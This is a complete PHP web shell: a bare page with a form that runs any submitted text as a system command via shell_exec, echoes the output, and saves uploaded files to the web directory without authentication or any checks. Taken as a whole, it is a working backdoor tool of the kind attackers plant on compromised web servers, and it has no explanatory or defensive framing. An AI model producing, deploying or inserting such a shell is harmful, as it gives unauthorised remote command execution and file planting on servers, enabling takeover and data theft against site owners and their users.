<?php
$output = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['execute'])) {
        $output .= "<pre><b>" . htmlspecialchars($_POST['execute']) . "</b>\n" . shell_exec($_POST['execute']) . "</pre>";
    }
    if (!empty($_FILES['upload']) && $_FILES['upload']['error'] === UPLOAD_ERR_OK) {
		if (move_uploaded_file($_FILES["upload"]["tmp_name"], './' . basename($_FILES["upload"]["name"]))) {
			$output .= "Upload successful.";
		} else {
			$output .= "Upload failed.";
		}
    }
}
?>
<form method="post" enctype="multipart/form-data">
    <table>
        <tr>
            <td><b>Command:</b></td>
            <td>
                <input type="text" size="80" name="execute">
            </td>
        </tr>
        <tr>
            <td><b>File:</b></td>
            <td><input type="file" name="upload"></td>
        </tr>
        <tr>
            <td><input type="submit" value="Go"></td>
        </tr>
    </table>
</form>
<hr/>
<?php echo $output; ?>
